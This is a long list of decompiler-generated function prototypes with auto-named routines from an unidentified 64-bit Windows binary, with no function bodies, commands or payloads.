signed __int64 __fastcall sub_140032280(char *a1, _WORD *a2, unsigned __int64 a3, __int64 a4);
unsigned __int64 __fastcall sub_140032330(_QWORD *a1, _QWORD *a2, _QWORD *a3, unsigned __int64 a4);
bool __fastcall sub_1400324B0(__int64 *a1, unsigned __int64 a2);
__int64 __fastcall sub_1400325C0(void *Src, __int64 a2, __int64 a3, __int64 a4);
__int64 __fastcall sub_140032930(_QWORD *a1);
void __fastcall sub_1400329A0(_QWORD *a1, unsigned __int64 a2);
signed __int64 __fastcall sub_140032A80(__int64 a1);
void __fastcall sub_140032B50(void *Src);
// _QWORD *__usercall sub_140032EB0@<rax>(void *Src@<rcx>, __int64 a2@<rdx>, __int64 a3@<r8>, char *a4@<r9>, __int64 a5);
signed __int64 __fastcall sub_140032F60(char *a1, __int16 a2, unsigned __int64 a3);
signed __int64 __fastcall sub_140033030(__int64 *a1, unsigned __int64 a2);
_QWORD *__fastcall sub_140033240(_QWORD *a1, _QWORD *a2, unsigned __int64 a3, unsigned __int64 a4);
// __int64 __fastcall sub_140033280(_QWORD); weak
__int64 __fastcall sub_1400332F0(__int64 *a1, __int64 a2);
std::exception *__fastcall sub_1400333D0(std::exception *a1, const struct std::exception *a2);
std::exception *__fastcall sub_140033420(std::exception *a1, __int128 *a2, _QWORD *a3, _QWORD *a4, __int128 *a5);
std::exception *__fastcall sub_140033550(std::exception *a1, _QWORD *a2, _QWORD *a3, __int128 *a4);
__int64 __fastcall sub_140033650(_QWORD *a1);
void __fastcall sub_140033700(__int64 a1);
void *__fastcall sub_140033780(void *a1, char a2);
// __int64 __fastcall sub_1400337B0(_QWORD, _QWORD); weak
char __fastcall sub_140033930(_QWORD *a1, __int64 a2);
void __fastcall sub_140033A90(__int64 a1);
bool __fastcall sub_140033E50(__int64 a1, _QWORD *a2, _QWORD *a3, _DWORD *a4, __int128 *a5);
bool __fastcall sub_140033F30(__int64 a1, _QWORD *a2, _DWORD *a3, _QWORD *a4);
// __int64 __fastcall sub_140033FF0(_QWORD); weak
__int64 __fastcall sub_1400340D0(__int64 a1, char a2);
__int64 __fastcall sub_1400343C0(__int64 a1, _QWORD *a2, __int64 a3);
signed __int64 __fastcall sub_140034510(_QWORD *a1, __int64 a2);
char __fastcall sub_1400345E0(LPCWSTR lpPathName, __int64 a2);
// __int64 __fastcall sub_140034730(LPCWSTR lpPathName); idb
__int64 __fastcall sub_140034880(_QWORD *a1);
_DWORD *__fastcall sub_1400348D0(_DWORD *a1, _QWORD *a2, __int64 a3);
_QWORD *__fastcall sub_140034C40(_QWORD *a1, char a2);
// __int64 sub_140034C70(void); weak
void *__fastcall sub_140034CC0(__int64 a1, _BYTE *a2, int a3);
const char *sub_140034D70();
signed __int64 __fastcall sub_140034D80(__int64 a1, __int64 a2, const CHAR *a3, __int64 a4, _QWORD *a5, WCHAR *lpWideCharStr, __int64 a7, WCHAR **a8);
signed __int64 __fastcall sub_140034E10(__int64 a1, __int64 a2, const WCHAR *a3, __int64 a4, _QWORD *a5, CHAR *lpMultiByteStr, int a7, CHAR **a8);
_QWORD *__fastcall sub_140034EC0(_QWORD *a1);
int __fastcall sub_140034FB0(__int64 **a1);
BOOL __fastcall sub_140035150(void *a1, const LARGE_INTEGER *a2, LONG a3, void (__stdcall *a4)(LPVOID lpArgToCompletionRoutine, DWORD dwTimerLowValue, DWORD dwTimerHighValue), void *a5);
int __fastcall sub_140035160(volatile signed __int32 *a1, void (__cdecl *a2)(__int64));
DWORD __fastcall sub_140035390(__int64 a1);
// __int64 __fastcall sub_1400353B0(_QWORD, _QWORD); weak
_DWORD *__fastcall sub_140035580(__int64 *a1, _DWORD *a2);
__int64 __fastcall sub_140035710(__int64 *a1, __int64 a2, _BYTE *a3);
// __int64 __fastcall sub_1400357F0(_QWORD, _QWORD); weak
struct _FILETIME __fastcall sub_140035990(__int64 a1);
DWORD *__fastcall sub_140035BF0(DWORD *a1);
_DWORD *__fastcall sub_140035C10(__int64 *a1, _DWORD *a2);
__int64 *__fastcall sub_140035C80(__int64 *a1, __int64 *a2);
signed __int64 *__fastcall sub_140035CB0(signed __int64 *a1, __int64 *a2);
struct tm *__fastcall sub_140035DA0(const __time64_t *a1, const char *a2);
int __fastcall sub_140035E00(__int64 *a1);
char __fastcall sub_140035E70(void *a1, __int64 a2);
bool sub_140036180();
__int64 __fastcall sub_1400361D0(__int64 *a1);
_BOOL8 __fastcall sub_1400362F0(__int64 *a1);
signed int __fastcall sub_140036360(__int64 a1);
char __fastcall sub_140036410(__int64 a1, __int64 a2);
// __int64 __fastcall sub_1400364F0(_QWORD); weak
signed int __fastcall sub_140036570(__int64 a1);
BOOL sub_140036670();
void __cdecl sub_1400366A0(); // idb
int __fastcall sub_1400366B0(volatile signed __int32 **a1);
__int64 __fastcall sub_140036710(__int64 a1, __int64 a2);
void sub_140036830();
char __fastcall sub_140036990(void **a1);
// unsigned int __stdcall StartAddress(void *); idb
void sub_140036A80();
__int64 sub_140036A90();
__int64 sub_140036AA0();
__int64 sub_140036AC0();
void __fastcall TlsCallback_0(__int64 a1, int a2);
signed __int64 __fastcall sub_140036AE0(__int64 a1, int a2);
__int64 __fastcall sub_140036B50(__int64 a1, __int64 a2, __int64 a3, char a4);
__int64 __fastcall sub_140036C20(__int64 a1, __int64 a2, __int64 a3, char a4);
_QWORD *__fastcall sub_140036CB0(_QWORD *a1, __int64 a2, __int64 a3);
std::exception *__fastcall sub_140036CF0(std::exception *a1, const struct std::exception *a2);
std::exception *__fastcall sub_140036D20(std::exception *a1, const struct std::exception *a2);
__int64 __fastcall sub_140036DA0(__int64 a1, char a2);
std::exception *__fastcall sub_140036F30(std::exception *a1, const struct std::exception *a2);
std::exception *__fastcall sub_140036F60(std::exception *a1, _QWORD *a2, unsigned __int64 a3);
__int64 __fastcall sub_1400370B0(__int64 a1, __int64 a2);
_DWORD *__fastcall sub_140037130(_DWORD *a1);
__int64 __fastcall sub_140037210(__int64 a1);
void __fastcall sub_140037260(__int64 a1);
__int64 __fastcall sub_140037290(__int64 a1, __int64 a2);
void *__fastcall sub_140037308(__int64 a1, char a2);
_QWORD *__fastcall sub_140037320(void *a1, char a2);
unsigned __int64 __fastcall sub_140037390(__int64 a1, unsigned __int64 a2, unsigned __int64 a3, unsigned __int64 a4, unsigned __int64 a5, char a6);
_QWORD *__fastcall sub_1400374B0(__int64 a1, _QWORD *a2);
void *__fastcall sub_1400374F0(__int64 a1, void *a2);
char __fastcall sub_140037520(__int64 *a1);
char __fastcall sub_140037570(__int64 *a1);
__int64 __fastcall sub_1400375C0(__int64 a1, void *a2, __int64 a3, __int64 a4);
__int64 __fastcall sub_140037650(__int64 a1, __int64 a2);
__int64 __fastcall sub_1400376D0(__int64 a1);
__int64 __fastcall sub_1400376E0(__int64 *a1, __int64 a2, __int64 a3);
__int64 __fastcall sub_140037880(__int64 *a1, __int64 a2, unsigned __int8 a3, unsigned int a4, unsigned __int8 a5);
__int64 __fastcall sub_140037910(__int64 *a1, __int64 a2, __int64 a3, unsigned __int8 a4);
__int64 __fastcall sub_140037990(__int64 a1, __int64 a2, __int64 a3, __int64 a4, unsigned int a5, char a6);
__int64 __fastcall sub_140037A30(__int64 *a1, __int64 a2, __int64 a3, __int64 a4, unsigned int a5);
__int64 __fastcall sub_140037A80(__int64 a1);
void __noreturn sub_140037AD0();
__int64 __fastcall sub_140037B90(__int64 a1, __int64 a2);
__int64 __fastcall sub_140037C10(__int64 a1, unsigned __int8 a2, unsigned int a3, char a4);
__int64 __fastcall sub_140037C40(__int64 a1, __int64 a2, __int64 a3, unsigned __int8 a4);
__int64 __fastcall sub_140037C50(__int64 a1);
void __noreturn sub_140037C70();
__int64 __fastcall sub_140037D30(__int64 a1, __int64 a2, __int64 a3);
__int64 __fastcall sub_140037DA0(__int64 a1);
char *__fastcall sub_140037DC0(__int64 a1, __int64 a2, __int64 a3, unsigned __int64 a4);
__int64 __fastcall sub_140037EB0(__int64 a1, __int64 a2, __int64 a3, __int64 a4);
__int64 __fastcall sub_140037F00(__int64 a1, int a2, int a3);
__int64 __fastcall sub_140037FB0(__int64 *a1, __int64 a2);
__int64 __fastcall sub_140038010(__int64 a1, __int64 a2, __int64 a3);
_QWORD *__fastcall sub_1400380E0(void *Src);
_QWORD *__fastcall sub_1400382C0(void *Src);
__int64 __fastcall sub_140038790(__int64 a1, __int64 a2, __int64 a3);
__int64 __fastcall sub_1400388F0(__int64 a1);
__int64 __fastcall sub_140038920(__int64 a1, _QWORD *a2, __int64 a3);
__int64 __fastcall sub_140038960(__int64 a1);
__int64 __fastcall sub_1400389A0(__int64 a1, __int64 a2, __int64 a3);
__int64 __fastcall sub_1400389E0(__int64 *a1, _WORD *a2, int a3);
__int64 __fastcall sub_140038A10(__int64 *a1, int *a2, int a3);
void __noreturn sub_140038A40();
__int64 __fastcall sub_140038B00(__int64 a1);
__int64 __fastcall sub_140038B10(__int64 a1);
__int64 __fastcall sub_140038BD0(__int64 a1, __int64 a2, unsigned __int8 a3);
__int64 __fastcall sub_140038BE0(__int64 a1, __int64 a2);
void __fastcall sub_140038C40(__int64 a1, unsigned __int64 a2);
__int64 __fastcall sub_140038CD0(__int64 a1);
__int64 __fastcall sub_140038D90(__int64 a1);
__int64 __fastcall sub_140038DA0(__int64 *a1, __int64 a2);
__int64 __fastcall sub_140038E00(__int64 a1, __int64 a2, __int64 a3);
__int64 __fastcall sub_140038ED0(__int64 *a1, _WORD *a2, int a3);
__int64 __fastcall sub_140038F50(__int64 *a1, int *a2, int a3);
__int64 __fastcall sub_140038FF0(__int64 a1, __int64 a2, __int64 a3, __int64 a4);
__int64 __fastcall sub_140039100(__int64 a1);
__int64 __fastcall sub_140039110(__int64 *a1, unsigned int a2, int a3, char a4);
__int64 __fastcall sub_140039150(__int64 a1, __int64 a2, __int64 a3, void (__fastcall ***a4)(_QWORD, signed __int64));
__int64 __fastcall sub_1400391A0(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, __int64 a7);
__int64 __fastcall sub_140039240(__int64 a1, __int64 a2, unsigned __int64 a3, __int64 a4);
__int64 __fastcall sub_1400392A0(__int64 a1, __int64 a2);
__int64 __fastcall sub_1400392F0(__int64 a1, __int64 a2);
__int64 __fastcall sub_1400393B0(__int64 a1);
void __fastcall sub_1400394F0(__int64 a1, __int64 a2);
unsigned __int64 __fastcall sub_1400395E0(_QWORD *a1, int a2);
__int64 __fastcall sub_140039770(__int64 a1, unsigned __int64 a2);
__int64 __fastcall sub_140039810(__int64 a1, unsigned __int64 a2);
__int64 __fastcall sub_140039900(__int64 a1);
__int64 __fastcall sub_1400399F0(__int64 *a1);
__int64 __fastcall sub_140039A30(__int64 a1, __int64 a2, __int64 a3, char a4);
__int64 __fastcall sub_140039C00(__int64 a1, __int64 a2, unsigned int *a3, __int64 a4, char a5);
__int64 __fastcall sub_140039D50(__int64 a1, __int64 a2, _QWORD *a3);
_BOOL8 __fastcall sub_140039D60(__int64 a1, __int64 a2, unsigned __int64 a3);
__int64 __fastcall sub_140039E10(__int64 a1, void (__fastcall ***a2)(_QWORD, signed __int64));
__int64 __fastcall sub_140039E60(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5);
// __int64 __cdecl sub_140039EF0(_QWORD); weak
void *__fastcall sub_140039F50(size_t Size);
// void __cdecl aligned_free(void *Memory);
void *__fastcall sub_14003A000(size_t Size);
// void __cdecl free(void *Memory);
bool __fastcall sub_14003A0A0(__int64 a1, __int64 a2, unsigned __int64 a3);
void __fastcall sub_14003A1E0(unsigned __int64 a1, unsigned __int64 a2, unsigned __int64 a3, unsigned __int64 a4);
void __fastcall sub_14003A4B0(unsigned __int64 a1, unsigned __int64 a2, unsigned __int64 a3);
size_t *__fastcall sub_14003A8B0(size_t *a1, char a2, _QWORD *a3);
// __int64 __fastcall sub_14003A970(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD); weak
__int64 __fastcall sub_14003AA40(__int64 a1, __int64 a2, _DWORD *a3, char a4);
signed __int64 __fastcall sub_14003AB00(_QWORD *a1, int a2, char a3);
__int64 __fastcall sub_14003AC00(unsigned int *a1, unsigned int a2, unsigned int a3);
unsigned __int64 __fastcall sub_14003ACF0(__int64 *a1, unsigned __int64 a2, unsigned __int64 a3);
__int64 __fastcall sub_14003AE30(__int64 a1, __int64 a2, __int64 a3, __int64 a4);
_QWORD *__fastcall sub_14003AF30(void *Dst, unsigned __int64 a2, unsigned int a3);
__int64 __fastcall sub_14003B100(__int64 a1, __int64 a2, __int64 a3, unsigned __int8 a4);
__int64 __fastcall sub_14003B190(__int64 a1, __int64 a2);
__int64 __fastcall sub_14003B1F0(__int64 a1, __int64 (__fastcall **a2)(void *));
__int64 __fastcall sub_14003B810(__int64 a1);
__int64 __fastcall sub_14003B890(__int64 a1, __int64 a2);
void **__fastcall sub_14003B980(void **a1, const void **a2);
__int64 __fastcall sub_14003BA00(__int64 a1, const void *a2, size_t a3);
_QWORD *__fastcall sub_14003BA90(_QWORD *a1, __int64 a2);
__int64 __fastcall sub_14003BC90(__int64 a1, __int64 a2, __int64 a3);
_DWORD *__fastcall sub_14003BD50(_DWORD *a1);
__int64 __fastcall sub_14003BE30(__int64 a1, __int64 a2, unsigned __int64 a3);
_QWORD *__fastcall sub_14003BED0(_QWORD *a1, __int64 a2, __int64 a3, __int64 a4, char a5, __int64 a6, __int64 a7);
_QWORD *__fastcall sub_14003BFA0(_QWORD *a1, __int64 a2);
__int64 __fastcall sub_14003C000(__int64 a1, __int64 a2);
__int64 __fastcall sub_14003C0E0(__int64 a1, int a2);
_QWORD *__fastcall sub_14003C170(_QWORD *a1, __int64 a2, __int64 a3, int a4);
void __fastcall sub_14003C210(void *a1);
std::exception *__fastcall sub_14003C280(std::exception *a1, const struct std::exception *a2);
_DWORD *__fastcall sub_14003C300(_DWORD *a1);
std::exception *__fastcall sub_14003C3D0(std::exception *a1, const struct std::exception *a2);
_DWORD *__fastcall sub_14003C450(_DWORD *a1);
void __fastcall sub_14003C520(__int64 a1);
void __fastcall sub_14003C550(__int64 a1);
__int64 __fastcall sub_14003C5B0(__int64 a1);
__int64 __fastcall sub_14003C5E0(__int64 a1);
signed __int64 __fastcall sub_14003C630(__int64 a1);
__int64 __fastcall sub_14003C670(__int64 a1, __int64 a2);
_QWORD *__fastcall sub_14003C710(_QWORD *a1, __int64 a2);
__int64 __fastcall sub_14003CA00(__int64 a1, __int64 a2, unsigned __int64 a3);
// __int64 __fastcall sub_14003CA80(_QWORD, _QWORD); weak
char __fastcall sub_14003CDA0(__int64 a1);
__int64 __fastcall sub_14003CDE0(__int64 a1);
__int64 __fastcall sub_14003CF00(__int64 a1);
__int64 __fastcall sub_14003D010(__int64 a1, __int64 a2);
void **__fastcall sub_14003D080(void **a1, const void **a2, int a3);
unsigned __int64 __fastcall sub_14003D0F0(__int64 *a1, unsigned __int64 a2);
unsigned __int64 __fastcall sub_14003D190(__int64 *a1, unsigned __int64 a2);
bool __fastcall sub_14003D250(__int64 a1, __int64 a2);
bool __fastcall sub_14003D2B0(__int64 a1, __int64 a2);
_QWORD *sub_14003D310();
_QWORD *sub_14003D3A0();
__int64 __fastcall sub_14003D430(__int64 a1);
_QWORD *__fastcall sub_14003D490(_QWORD *a1, int a2);
__int64 __fastcall sub_14003D540(__int64 a1, __int64 a2);
__int64 __fastcall sub_14003D5D0(__int64 a1, __int64 a2);
__int64 __fastcall sub_14003D660(__int64 a1, unsigned __int64 a2);
__int64 __fastcall sub_14003D760(__int64 a1, unsigned __int64 a2);
void *__fastcall sub_14003D850(void *a1, char a2);
_QWORD *__fastcall sub_14003D8D0(void *a1, char a2);
void *__fastcall sub_14003D940(void *a1, char a2);
_QWORD *__fastcall sub_14003D990(void *a1, char a2);
void *__fastcall sub_14003D9F0(void *a1, char a2);
__int64 __fastcall sub_14003DA40(__int64 a1, __int64 a2);
__int64 __fastcall sub_14003DA70(__int64 a1, __int64 a2, __int64 a3);
__int64 __fastcall sub_14003DA80(__int64 a1, __int64 a2, __int64 a3);
__int64 __fastcall sub_14003DBD0(__int64 a1, __int64 a2);
signed __int64 __fastcall sub_14003DC30(__int64 a1, __int64 a2, __int64 a3);
_QWORD *__fastcall sub_14003DDA0(__int64 a1, _QWORD *a2);
__int64 __fastcall sub_14003DE60(char *a1, char *a2, char *a3, __int64 a4, char *Src, __int64 a6);
bool __fastcall sub_14003E2C0(_QWORD *a1);
char __fastcall sub_14003E2E0(__int64 a1, __int64 a2, int *a3);
__int64 __fastcall sub_14003E400(__int64 a1, void *a2, __int64 a3, __int64 a4);
__int64 __fastcall sub_14003E490(__int64 a1, void *a2, __int64 a3, _DWORD *a4);
int __fastcall sub_14003E520(unsigned __int64 *a1, __int64 a2, __int64 a3, unsigned __int64 a4, __int64 a5, unsigned __int64 a6);
__int64 __fastcall sub_14003E8A0(__int64 a1, __int64 a2);
void __noreturn sub_14003E950();
unsigned __int64 __fastcall sub_14003E980(_QWORD *a1, unsigned __int64 *a2, unsigned __int64 *a3);
unsigned __int64 __fastcall sub_140040750(_QWORD *a1, unsigned __int64 *a2, unsigned __int64 *a3);
unsigned __int64 __fastcall sub_1400407D0(_QWORD *a1, unsigned __int64 *a2, unsigned __int64 *a3);
unsigned __int64 __fastcall sub_1400409C0(_QWORD *a1, unsigned __int64 *a2, unsigned __int64 *a3);
unsigned __int64 __fastcall sub_1400410F0(_QWORD *a1, unsigned __int64 *a2, unsigned __int64 *a3);
__int64 __fastcall sub_140041E80(_QWORD *a1, unsigned __int64 *a2, unsigned __int64 *a3);
unsigned __int64 __fastcall sub_140041EB0(_QWORD *a1, unsigned __int64 *a2, unsigned __int64 *a3);
unsigned __int64 __fastcall sub_140041F90(_QWORD *a1, unsigned __int64 *a2, unsigned __int64 *a3);
unsigned __int64 __fastcall sub_140042300(_QWORD *a1, unsigned __int64 *a2, unsigned __int64 *a3, unsigned __int64 a4);
unsigned __int64 __fastcall sub_140043360(unsigned __int64 *a1, unsigned __int64 *a2, unsigned __int64 *a3);
unsigned __int64 __fastcall sub_1400433F0(_QWORD *a1, unsigned __int64 *a2, unsigned __int64 *a3, unsigned __int64 a4);
unsigned __int64 __fastcall sub_1400435B0(_QWORD *a1, unsigned __int64 *a2, unsigned __int64 *a3, unsigned __int64 a4);
unsigned __int64 __fastcall sub_140043AB0(_QWORD *a1, unsigned __int64 *a2);
unsigned __int64 __fastcall sub_140044C10(_QWORD *a1, unsigned __int64 *a2);
unsigned __int64 __fastcall sub_140044C80(_QWORD *a1, unsigned __int64 *a2);
unsigned __int64 __fastcall sub_140044E20(_QWORD *a1, unsigned __int64 *a2);
__int64 __fastcall sub_140045340(__int64 a1);
signed __int64 sub_1400453B0();
__int64 __fastcall sub_1400453C0(__int64 a1);
__int64 __fastcall sub_140045430(__int64 a1, __int64 a2, __int64 a3, __int64 a4);
__int64 __fastcall sub_140045470(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5);
void __noreturn sub_140045690();
void __noreturn sub_140045750();
void __fastcall sub_140045810(unsigned __int64 a1);
void __fastcall sub_1400458E0(__int64 a1, unsigned __int64 a2);
_QWORD *__fastcall sub_1400459C0(__int64 a1);
signed __int64 __fastcall sub_140045A20(__int64 a1, __int64 a2, __int64 a3);
signed __int64 __fastcall sub_140045A60(__int64 a1, __int64 a2);
__int64 __fastcall sub_140045AA0(_QWORD *a1, __int64 a2, __int64 a3);
__int64 __fastcall sub_140045B70(__int64 a1);
signed __int64 __fastcall sub_140045B80(__int64 a1, unsigned __int64 *a2, __int64 a3, __int64 a4, unsigned __int64 a5);
void __fastcall sub_140045C40(__int64 a1, __int64 a2);
void __fastcall sub_140045CD0(__int64 a1, __int64 a2, unsigned __int64 a3, int a4);
char *__fastcall sub_140045E60(__int64 a1, __int64 a2, char a3, int a4, int a5);
__int64 __fastcall sub_140045FB0(__int64 a1, __int64 a2, __int64 a3);
char *__fastcall sub_140046010(char *a1, __int64 a2, _QWORD *a3, _QWORD *a4, rsize_t a5, _QWORD *Src, unsigned __int64 a7);
void __fastcall sub_140046420(__int64 a1, __int64 a2, __int64 a3, __int64 a4);
void __fastcall sub_1400465A0(__int64 *a1, __int64 a2, __int64 a3, unsigned __int64 a4);
void __fastcall sub_1400469D0(_BYTE *a1, _BYTE *a2, __int64 a3, __int64 a4, __int64 a5);
void __fastcall sub_140046AE0(__int64 a1, __int64 a2, __int64 a3, unsigned int a4);
__int64 __fastcall sub_140046CF0(__int64 a1, __int64 a2, __int64 a3);
__int64 __fastcall sub_140046E00(__int64 a1, void *a2, unsigned __int64 a3);
void __fastcall sub_140046E70(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5);
__int64 __fastcall sub_140046E90(__int64 a1, __int64 a2);
__int64 __fastcall sub_140046EF0(__int64 a1, __int64 a2);
// __int64 __fastcall sub_140046F20(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD);
__int64 __fastcall sub_140047070(__int64 a1, __int64 a2, __int64 a3, unsigned int a4);
bool __fastcall sub_140047100(__int64 a1, __int64 a2, __int64 a3);
__int64 __fastcall sub_140047170(__int64 a1, __int64 a2);
__int64 __fastcall sub_1400471A0(__int64 *a1, __int64 a2);
// __int64 __cdecl sub_1400471E0(_QWORD); weak
char *__fastcall sub_1400472D0(__int64 a1, __int64 a2, __int64 a3);
char __fastcall sub_140047310(__int64 a1, __int64 a2, __int64 a3);
char __fastcall sub_140048010(__int64 a1, unsigned __int64 a2);
_QWORD *__fastcall sub_140048040(void *Src);
_QWORD *__fastcall sub_140048460(void *Src);
__int64 __fastcall sub_140048610(__int64 a1, _DWORD *a2);
__int64 sub_140048620();
void __fastcall sub_140048630(__int64 a1);
__int64 __fastcall sub_140048640(__int64 a1, __int64 a2);
signed __int64 __fastcall sub_1400486A0(_QWORD *a1, __int64 a2);
__int64 __fastcall sub_140048790(__int64 a1, __int64 a2, __int64 a3);
signed __int64 __fastcall sub_140048CB0(__int64 a1, unsigned __int64 a2);
_BOOL8 __fastcall sub_140048D40(signed __int64 a1);
char __fastcall sub_140048E00(__int64 a1, __int64 a2);
char __fastcall sub_140048E40(__int64 a1);
__int64 __fastcall sub_140048E80(__int64 *a1);
void __noreturn sub_140048E90();
__int64 __fastcall sub_140048F60(__int64 a1, int a2);
__int64 __fastcall sub_1400490B0(__int64 a1, __int64 a2, __int64 a3);
__int64 __fastcall sub_140049160(__int64 a1, __int64 a2);
// __int64 __fastcall sub_1400491C0(_QWORD, _QWORD); weak
__int64 __fastcall sub_140049290(__int64 a1, unsigned __int64 a2);
// int __usercall sub_1400493F0@<eax>(void *Dst@<rcx>, __int64 a2@<rdx>, __int64 a3@<r8>, __int64 a4@<r9>, __int64 a5, __int64 a6);
__int64 __fastcall sub_140049520(__int64 a1, __int64 a2);
__int64 sub_140049570();
__int64 __fastcall sub_140049580(__int64 a1, __int64 a2);
signed __int64 __fastcall sub_1400495E0(__int64 a1, __int64 a2);
__int64 __fastcall sub_1400496F0(__int64 a1, __int64 a2);
__int64 __fastcall sub_140049760(__int64 a1, __int64 a2);
char __fastcall sub_1400497C0(__int64 a1, __int64 a2, __int64 a3);
signed __int64 __fastcall sub_140049840(_QWORD *a1, __int64 a2, __int64 a3);
void __fastcall sub_140049910(void *a1, const void *a2, __int64 a3, __int64 a4, unsigned __int64 a5);
signed __int64 __fastcall sub_1400499D0(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, unsigned __int64 a6);
void __fastcall sub_140049D90(__int64 a1, unsigned __int64 a2);
_BOOL8 __fastcall sub_140049E20(__int64 a1);
__int64 sub_140049E30();
signed __int64 sub_140049E40();
// __int64 __fastcall sub_140049E50(_QWORD, _QWORD); weak
signed __int64 __fastcall sub_140049F00(__int64 a1, __int64 a2, __int64 a3);
signed __int64 __fastcall sub_14004A0B0(__int64 a1, __int64 a2);
void __fastcall sub_14004A160(__int64 a1, __int64 a2, __int64 a3, __int64 a4);
void __fastcall sub_14004A350(__int64 a1, __int64 a2, __int64 a3);
unsigned __int64 __fastcall sub_14004A490(__int64 a1, __int64 a2, __int64 a3);
// __int64 __fastcall sub_14004A6C0(_QWORD, _QWORD); weak
void __noreturn sub_14004A760();
void __fastcall sub_14004A820(__int64 a1, __int64 a2, __int64 a3, __int64 a4);
void __fastcall sub_14004AA20(__int64 a1, __int64 a2, unsigned __int64 a3);
__int64 __fastcall sub_14004AB20(__int64 a1, __int64 a2, __int64 a3, __int64 a4, char a5, __int64 a6, __int64 a7);
__int64 __fastcall sub_14004AC00(__int64 a1, __m128i *a2, _QWORD *a3, unsigned __int64 a4);
unsigned __int64 __fastcall sub_14004ADC0(__int64 a1, __int64 a2, __int64 a3, __int64 a4, unsigned __int64 a5);
__int64 __fastcall sub_14004B130(__int64 a1, __int64 a2, __int64 a3, __int64 a4, unsigned __int64 a5);
__int64 __fastcall sub_14004B210(__int64 a1, __int64 a2, __int64 a3, unsigned __int64 a4);
__int64 __fastcall sub_14004B320(__int64 a1, __int64 a2, __int64 a3);
__int64 __fastcall sub_14004B330(__int64 a1, __int64 a2, __int64 a3);
// __int64 __fastcall sub_14004B3C0(_QWORD); weak
// __int64 __fastcall sub_14004B450(_QWORD); weak
// __int64 __fastcall sub_14004B4E0(_QWORD); weak
signed __int64 __fastcall sub_14004B580(unsigned __int64 a1);
// __int64 __cdecl cfltcvt_init(_QWORD); weak
__int64 *__fastcall sub_14004B6F0(char *a1, unsigned __int64 a2, unsigned __int64 a3);
__int64 *__fastcall sub_14004B770(__int64 *a1, unsigned __int64 a2, unsigned __int64 a3);
void __fastcall sub_14004B7E0(__int64 a1, __int64 a2, __int64 a3, __int64 a4, unsigned int a5);
__int64 __fastcall sub_14004B990(__int64 a1, __int64 a2);
signed __int64 __fastcall sub_14004B9F0(_QWORD *a1, __int64 a2);
__int64 __fastcall sub_14004BAA0(signed __int64 a1, __int64 a2);
__int64 __fastcall sub_14004BF20(__int64 a1, __int64 a2, __int64 a3);
signed __int64 __fastcall sub_14004BF80(__int64 a1, __int64 a2, __int64 a3);
// __int64 __fastcall sub_14004C040(_QWORD, _QWORD); weak
__int64 sub_14004C0A0();
__int64 __fastcall sub_14004C0B0(unsigned __int64 *a1, unsigned __int64 a2);
__int64 __fastcall sub_14004C170(__int64 *a1, __int64 a2);
__int64 __fastcall sub_14004C1B0(__int64 a1, __int64 a2, __int64 a3, __int64 a4);
__int64 __fastcall sub_14004C1F0(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5);
__int64 __fastcall sub_14004C240(__int64 a1);
__int64 sub_14004C270();
char __fastcall sub_14004C280(_QWORD *a1, unsigned __int64 a2);
char __fastcall sub_14004C300(_QWORD *a1, unsigned __int64 a2, _DWORD *a3);
char *__fastcall sub_14004C370(__int64 a1, unsigned __int64 a2);
unsigned __int64 __fastcall sub_14004C440(_QWORD *a1, unsigned __int64 a2);
void *__fastcall sub_14004C4D0(void *a1, __int64 a2, __int64 a3, __int64 a4);
_QWORD *__fastcall sub_14004C5A0(_QWORD *a1);
void **__fastcall sub_14004C5E0(void **a1);
void **__fastcall sub_14004C630(void **a1);
void __fastcall sub_14004C680(__int64 a1, unsigned __int64 a2);
__int64 __fastcall sub_14004C750(__int64 a1, __int64 a2);
_QWORD *__fastcall sub_14004C790(_QWORD *a1, char *a2, size_t *a3);
__int64 __fastcall sub_14004C7E0(__int64 a1, __int64 a2, _QWORD *a3, char a4);
void __fastcall sub_14004C8A0(__int64 a1, int *a2, char a3, unsigned int a4, unsigned int a5);
signed __int64 __fastcall sub_14004C9F0(_QWORD *a1, int a2, char a3);
__int64 __fastcall sub_14004CAF0(__int64 a1, __int64 *a2, __int64 a3, __int64 a4);
__int64 __fastcall sub_14004CDA0(__int64 a1, __int64 a2, _QWORD *a3, char a4);
__int64 __fastcall sub_14004CE30(unsigned int *a1, unsigned int *a2);
__int64 __fastcall sub_14004CF50(__int64 a1, signed __int64 a2, signed __int64 a3, __int64 a4);
void __fastcall sub_14004D070(__int64 a1, __int64 a2);
void __fastcall sub_14004D2D0(__int64 a1, __int64 a2);
__int64 __fastcall sub_14004D3C0(__int64 a1, signed __int64 a2, signed __int64 a3, __int64 a4);
// __int64 __fastcall sub_14004D4A0(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD); weak
__int64 __fastcall sub_14004D5F0(_QWORD *a1, __int64 a2);
void __fastcall sub_14004D640(void *a1, __int64 a2);
__int64 __fastcall sub_14004D6A0(__int64 a1, __int64 a2, __int64 a3);
__int64 __fastcall sub_14004D710(__int64 a1, __int64 a2, __int64 a3);
__int64 __fastcall sub_14004D780(__int64 a1, __int64 a2, __int64 a3);
__int64 __fastcall sub_14004D820(__int64 a1, __int64 a2, __int64 a3);
void __fastcall sub_14004D880(__int64 a1, __int64 a2);
void __fastcall sub_14004D8E0(__int64 a1, __int64 a2);
__int64 __fastcall sub_14004D940(__int64 a1, __int64 a2);
__int64 __fastcall sub_14004D9A0(__int64 a1, __int64 a2);
__int64 __fastcall sub_14004DA90(__int64 a1, __int64 a2);
__int64 __fastcall sub_14004DB10(__int64 a1, __int64 a2, const char *a3, __int64 a4, _QWORD *a5, __int64 a6);
_QWORD *__fastcall sub_14004DDB0(_QWORD *a1, unsigned __int64 a2);
void **__fastcall sub_14004DE20(void **a1, unsigned __int64 a2);
__int64 __fastcall sub_14004DE90(__int64 a1);
__int64 __fastcall sub_14004DF00(__int64 a1, __int64 a2, int a3, __int64 a4);
__int64 __fastcall sub_14004DFD0(__int64 a1);
__int64 __fastcall sub_14004E040(__int64 a1, __int64 a2);
void __fastcall sub_14004E120(__int64 a1);
_DWORD *__fastcall sub_14004E180(__int64 a1);
__int64 __fastcall sub_14004E1B0(__int64 *a1);
